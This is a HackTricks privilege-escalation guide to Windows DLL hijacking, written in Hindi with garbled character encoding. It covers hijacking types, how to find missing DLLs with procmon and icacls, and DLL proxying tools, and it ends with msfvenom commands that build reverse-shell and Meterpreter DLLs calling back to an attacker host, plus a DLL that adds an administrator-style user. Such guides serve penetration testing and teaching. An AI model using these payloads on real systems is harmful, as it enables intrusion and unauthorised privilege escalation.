# Dll Hijacking

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдзрд╛рд░рд╛рдкреНрд░рд╡рд╛рд╣ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ_).

{% embed url="https://www.stmcyber.com/careers" %}

## рдкрд░рд┐рднрд╛рд╖рд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд░рд╛рд╕реНрддреЗ рд╕реЗ рд╣рдЯрд╛ рджреЗрдВред DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ, рд╕рдмрд╕реЗ рд╡реНрдпрд╛рдкрдХ рдЕрд░реНрде рдореЗрдВ, **рдПрдХ рд╡реИрдз/рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХрд┐рд╕реА рдордирдорд╛рдиреЗ DLL рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд▓рд╛рдХреА рдХрд░рдирд╛ рд╣реИ**ред _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ рдФрд░ _DLL Side-Loading_ рдЬреИрд╕реЗ рд╢рдмреНрдж рдЕрдХреНрд╕рд░ -рдЧрд▓рддреА рд╕реЗ- рдПрдХ рд╣реА рдмрд╛рдд рдХрд╣рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ**, **рдкрд░реНрд╕рд┐рд╕реНрдЯреЗрдВрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдФрд░ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрди рддреАрдиреЛрдВ рдореЗрдВ рд╕реЗ **рд╕рдмрд╕реЗ рдХрдо рд╕рдВрднрд╛рд╡рдирд╛** **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐** рдХреА рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЪреВрдВрдХрд┐ рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдЕрдиреБрднрд╛рдЧ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдореИрдВ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░реВрдВрдЧрд╛ред рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд▓рдХреНрд╖реНрдп рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдПрдХ dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдПрдХ рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдкреНрд░рдХрд╛рд░

рдЪреБрдирдиреЗ рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╡рд┐рдзрддрд╛ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг** рд╣реИрдВ, рд╕рдлрд▓рддрд╛ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдкрдиреЗ рдЖрд╡рд╢реНрдпрдХ DLLs рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╕рдВрднрд╛рд╡рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдгреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

1. **DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рдПрдХ рд╡реИрдз DLL рдХреЛ рдПрдХ рджреБрд╖реНрдЯ DLL рд╕реЗ рдмрджрд▓реЗрдВред рдЗрд╕реЗ _DLL рдкреНрд░реЙрдХреНрд╕реАрдВрдЧ_ рдХреЗ рд╕рд╛рде рд╕рдВрдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], рдЬреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдореВрд▓ DLL рдХреА рд╕рднреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдмрд░рдХрд░рд╛рд░ рд░рд╣реЗред
2. **DLL рдЦреЛрдЬ рдХреНрд░рдо рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ DLLs рдмрд┐рдирд╛ рдкрде рдХреЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреНрд░рдо рдореЗрдВ рдирд┐рд╢реНрдЪрд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рдЦреЛрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. рдЦреЛрдЬ рдХреНрд░рдо рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдирд╛ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ рджреБрд╖реНрдЯ DLL рдбрд╛рд▓рдХрд░ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ DLL рд╕реЗ рдкрд╣рд▓реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдХрднреА-рдХрднреА рд▓рдХреНрд╖реНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдХрд╛рд░реНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред
3. **рдлреИрдВрдЯрдо DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдПрдХ рджреБрд╖реНрдЯ DLL рдХреЛ рдПрдХ рдЧрд╛рдпрдм/рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди DLL рдХреЗ рд╕реНрдерд╛рди рдкрд░ рдбрд╛рд▓реЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡реИрдз рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)]ред
4. **DLL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди**: DLL рдХреА рдЦреЛрдЬ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди рдХреЛ рдмрджрд▓реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `%PATH%` рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗ, рдпрд╛ `.exe.manifest` / `.exe.local` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рджреБрд╖реНрдЯ DLL рд╡рд╛рд▓реЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)]ред
5. **WinSxS DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рд▓рдХреНрд╖рд┐рдд DLL рдХреЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ WinSxS рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╡реИрдз DLL рдХреЛ рджреБрд╖реНрдЯ DLL рд╕реЗ рдмрджрд▓реЗрдВред рдЗрд╕реЗ рдЕрдХреНрд╕рд░ DLL рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]ред
6. **рд╕рд╛рдкреЗрдХреНрд╖ рдкрде DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ:** рд╡реИрдз рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдПрдВ (рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ рдирд╛рдо рдмрджрд▓реЗрдВ) рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ, рджреБрд╖реНрдЯ DLL рдХреЗ рд╕рд╛рдеред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕ рддрд░рд╣ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдореЗрдВ (Signed) Binary Proxy Execution \[[8](https://attack.mitre.org/techniques/T1218/)] рдХреЗ рд╕рд╛рде рд╕рдорд╛рдирддрд╛рдПрдВ рд╣реИрдВред рдЗрд╕рдХрд╛ рдПрдХ рд╡рд┐рд╡рд┐рдзрддрд╛ (рдХреБрдЫ рд╣рдж рддрдХ рд╡рд┐рд░реЛрдзрд╛рднрд╛рд╕реА рд░реВрдк рд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) 'рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ LOLbin рд▓рд╛рдУ' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)] рдЬрд┐рд╕рдореЗрдВ рд╡реИрдз рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреБрд╖реНрдЯ DLL рдХреЗ рд╕рд╛рде рд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдмрдЬрд╛рдп рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдкрд░ рд╡реИрдз рд╕реНрдерд╛рди рд╕реЗ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдХреЗ)ред

## рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдирд╛

рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдЧрд╛рдпрдм Dlls рдХреЛ рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрдо рддрд░реАрдХрд╛ sysinternals рд╕реЗ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) рдЪрд▓рд╛рдирд╛ рд╣реИ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 2 рдлрд┐рд▓реНрдЯрд░реНрд╕ рд╕реЗрдЯ рдХрд░реЗрдВ**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

рдФрд░ рдХреЗрд╡рд▓ **File System Activity** рджрд┐рдЦрд╛рдПрдВ:

![](<../../.gitbook/assets/image (314).png>)

рдпрджрд┐ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЧрд╛рдпрдм dlls рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ **рд╕реЗрдХрдВрдбреЛрдВ** рдХреЗ рд▓рд┐рдП рдЪрд▓рд╛рдиреЗ рджреЗрдВред\
рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдЧрд╛рдпрдм dll рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **рдПрдХ рдФрд░ рдлрд┐рд▓реНрдЯрд░ рдЬреИрд╕реЗ "Process Name" "contains" "\<exec name>", рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдФрд░ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрдВ**ред

## рдЧрд╛рдпрдм Dlls рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдореМрдХрд╛ рд╣реИ рдХрд┐ рд╣рдо рдХрд┐рд╕реА рдРрд╕реЗ dll рдХреЛ рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд┐рд╕реА рдРрд╕реЗ **рд╕реНрдерд╛рди рдкрд░ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧреА** рдЬрд╣рд╛рдВ рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рд╣рдо рдПрдХ dll рдХреЛ рдПрдХ **рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ **рд▓рд┐рдЦ** рд╕рдХреЗрдВрдЧреЗ рдЬрд╣рд╛рдВ **dll рдХреЛ рдореВрд▓ dll** рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдкрд╣рд▓реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЕрдЬреАрдм рдорд╛рдорд▓рд╛), рдпрд╛ рд╣рдо рдХрд┐рд╕реА рдРрд╕реЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХреЗрдВрдЧреЗ** рдЬрд╣рд╛рдВ dll рдХреЛ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдореВрд▓ **dll рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

### Dll рдЦреЛрдЬ рдХреНрд░рдо

**Microsoft рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдХреЗ рдЕрдВрджрд░** рдЖрдк рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ Dlls рдХреИрд╕реЗ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

рд╕рд╛рдорд╛рдиреНрдп
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
рдФрд░ **PATH рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдлреЛрд▓реНрдбрд░реНрд╕ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЬрд╛рдВрдЪреЗрдВ**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЖрдк рдПрдХ executable рдХреЗ imports рдФрд░ рдПрдХ dll рдХреЗ exports рдХреЛ рднреА рдЗрд╕рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
рдкреВрд░реА рдЧрд╛рдЗрдб рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рдореЗрдВ **System Path folder** рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде **Dll Hijacking рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ** рдХреА рдЬрд╛рдирдХрд╛рд░реА рд╣реИ, рджреЗрдЦреЗрдВ:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ system PATH рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рдлреЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред\
рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░реЛрдЪрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг **PowerSploit functions** рд╣реИрдВ: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ рдФрд░ _Write-HijackDll._

### рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рдкрд░рд┐рджреГрд╢реНрдп рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рддреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛрдЧрд╛ **рдПрдХ dll рдмрдирд╛рдирд╛ рдЬреЛ рдХрдо рд╕реЗ рдХрдо рд╕рднреА рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдЗрд╕рд╕реЗ рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░реЗрдЧрд╛**ред рд╡реИрд╕реЗ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Dll Hijacking [Medium Integrity level рд╕реЗ High **(UAC рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП)**](../authentication-credentials-uac-and-efs.md#uac) рдпрд╛ [**High Integrity рд╕реЗ SYSTEM**](./#from-high-integrity-to-system) рддрдХ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИред рдЖрдк **рд╡реИрдз dll рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг** рдЗрд╕ dll hijacking рдЕрдзреНрдпрдпрди рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ dll hijacking рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдЕрдЧрд▓реЗ рдЦрдВрдб** рдореЗрдВ рдЖрдк рдХреБрдЫ **рдмреБрдирд┐рдпрд╛рджреА dll рдХреЛрдб** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕** рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ **рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рд╕рд╛рде dll рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## **Dlls рдмрдирд╛рдирд╛ рдФрд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛**

### **Dll Proxifying**

рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **Dll proxy** рдПрдХ Dll рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рд▓реЗрдХрд┐рди рд╕рд╛рде рд╣реА **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд╕рднреА рдХреЙрд▓реНрд╕ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдХреЗ** рдФрд░ **рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдореНрдореАрдж рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдЙрдкрдХрд░рдг \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* рдпрд╛ \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\* рдХреЗ рд╕рд╛рде рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕реЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕рд┐рдлрд╛рдИ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЙрдХреНрд╕рд┐рдлрд╛рдЗрдб dll рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ **Dll рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдкреНрд░реЙрдХреНрд╕рд┐рдлрд╛рдЗрдб dll рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдореАрдЯрд░рдкреНрд░реАрдЯрд░ (x86) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдпреВрдЬрд░ рдмрдирд╛рдПрдВ (x86 рдореИрдВрдиреЗ x64 рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рджреЗрдЦрд╛):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### рдЖрдкрдХрд╛ рдЕрдкрдирд╛

